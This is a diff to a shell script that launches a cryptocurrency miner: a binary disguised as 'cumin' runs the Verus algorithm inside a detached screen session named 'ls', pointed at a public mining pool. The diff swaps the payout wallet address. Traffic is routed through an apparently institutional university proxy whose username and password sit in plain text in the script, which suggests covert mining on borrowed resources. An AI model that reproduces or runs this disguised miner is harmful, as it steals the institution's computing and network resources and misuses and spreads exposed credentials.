@@ -4,7 +4,7 @@ sudo apt install screen libjansson4 -y
 chmod +x cumin
 screen -dmS ls 
 POOL=stratum+tcp://eu.luckpool.net:3956
-WALLET=RTxdgLSqxiTVkUKegd5L5S3e8pJrAkK621
+WALLET=RXM8Btq8mJuPPk19t7B6hgZsty7p14cbpG
 WORKER=$(echo $(shuf -i 1-1 -n 1)-X)
 PROXY=http://ITS-576049-ed8ad:dbf6a@proxy.its.ac.id:8080
 ./cumin -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
